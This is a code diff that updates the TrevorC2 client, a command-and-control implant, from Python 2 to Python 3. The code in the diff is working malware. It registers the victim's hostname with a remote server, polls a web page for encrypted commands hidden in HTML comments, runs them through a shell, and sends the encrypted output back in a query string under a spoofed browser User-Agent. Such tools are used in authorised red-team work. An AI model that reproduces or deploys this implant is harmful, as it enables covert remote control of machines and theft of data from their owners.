@@ -35,23 +35,21 @@ CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")
 # DO NOT CHANGE BELOW THIS LINE
 
 
-# python 2/3 compatibility, need to move this to python-requests in future
-try:
-    import urllib2 as urllib
-    py = "2"
-except:
-    import urllib.request, urllib.parse, urllib.error
-    py = "3"
-import random
 import base64
-import time
-import subprocess
 import hashlib
+import http.cookiejar
+import platform
+import random
+import subprocess
+import sys
+import time
+import urllib.error
+import urllib.parse
+import urllib.request
+
 from Crypto import Random
 from Crypto.Cipher import AES
-import sys
-import platform
-import cookielib
+
 
 # AES Support for Python2/3 - http://depado.markdownblog.com/2015-05-11-aes-cipher-with-python-3-x
 class AESCipher(object):
@@ -59,6 +57,7 @@ class AESCipher(object):
     A classical AES Cipher. Can use any size of data and any size of password thanks to padding.
     Also ensure the coherence and the type of the data with a unicode to byte converter.
     """
+
     def __init__(self, key):
         self.bs = 16
         self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()
@@ -75,7 +74,7 @@ class AESCipher(object):
 
     @staticmethod
     def _unpad(s):
-        return s[:-ord(s[len(s)-1:])]
+        return s[:-ord(s[len(s) - 1:])]
 
     def encrypt(self, raw):
         raw = self._pad(AESCipher.str_to_bytes(raw))
@@ -98,28 +97,25 @@ cipher = AESCipher(key=CIPHER)
 def random_interval(time_interval1, time_interval2):
     return random.randint(time_interval1, time_interval2)
 
+
 hostname = platform.node()
-cookie = cookielib.CookieJar()
+cookie = http.cookiejar.CookieJar()
+
 
 def connect_trevor():
-    # we need to registery our asset first
+    # we need to register our asset first
     while 1:
         time.sleep(1)
         try:
-            hostname_send  = cipher.encrypt("magic_hostname=" + hostname).encode('utf-8')
+            hostname_send = cipher.encrypt("magic_hostname=" + hostname).encode('utf-8')
             hostname_send = base64.b64encode(hostname_send).decode('utf-8')
 
             # pipe out stdout and base64 encode it then request via a query string parameter
-            if py == "3":
-                req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-                opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
-                html = urllib.request.urlopen(req).read()
-                break
-            else:
-                req = urllib.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-                opener = urllib.build_opener(urllib.HTTPCookieProcessor(cookie))
-                html = opener.open(req).read()
-                break
+            req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={
+                'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
+            html = opener.open(req)
+            break
 
         # handle exceptions and pass if the server is unavailable, but keep going
         except Exception as error:
@@ -129,6 +125,7 @@ def connect_trevor():
             else:
                 print("[!] Something went wrong, printing error: " + str(error))
 
+
 connect_trevor()
 
 # main call back here
@@ -136,38 +133,30 @@ while 1:
     try:
         time.sleep(random_interval(time_interval1, time_interval2))
         # request with specific user agent
-        if py == "3":
-            req = urllib.request.Request(SITE_URL + ROOT_PATH_QUERY, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
-            html = urllib.request.urlopen(req).read().decode('utf-8')
-        else:
-            req = urllib.Request(SITE_URL + ROOT_PATH_QUERY, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-            opener = urllib.build_opener(urllib.HTTPCookieProcessor(cookie))
-            html = opener.open(req).read().decode('utf-8');
+        req = urllib.request.Request(SITE_URL + ROOT_PATH_QUERY, headers={
+            'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
+        html = opener.open(req).read().decode('utf-8')
 
         # <!-- PARAM=bm90aGluZw== --></body> -  What we split on here on encoded site
         parse = html.split("<!-- %s" % (STUB))[1].split("-->")[0]
         parse = cipher.decrypt(parse)
-        if parse == "nothing": pass
+        if parse == "nothing":
+            pass
         else:
             if hostname in parse:
                 parse = parse.split(hostname + "::::")[1]
                 # execute our parsed command
                 proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 stdout_value = proc.communicate()[0]
-                stdout_value = cipher.encrypt(hostname + "::::" + stdout_value).encode('utf-8')
+                stdout_value = cipher.encrypt(hostname + "::::" + stdout_value.decode('utf-8')).encode('utf-8')
                 stdout_value = base64.b64encode(stdout_value).decode('utf-8')
 
                 # pipe out stdout and base64 encode it then request via a query string parameter
-                if py == "3":
-                    req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-                    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
-                    html = urllib.request.urlopen(req).read()
-
-                else:
-                    req = urllib.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-                    opener = urllib.build_opener(urllib.HTTPCookieProcessor(cookie))
-                    html = opener.open(req).read()
+                req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+                opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
+                html = opener.open(req).read().decode('utf-8')
 
                 # sleep random interval and let cleanup on server side
                 time.sleep(random_interval(time_interval1, time_interval2))
@@ -181,5 +170,5 @@ while 1:
             print("[!] Something went wrong, printing error: " + str(error))
 
     except KeyboardInterrupt:
-        print ("\n[!] Exiting TrevorC2 Client...")
+        print("\n[!] Exiting TrevorC2 Client...")
         sys.exit()
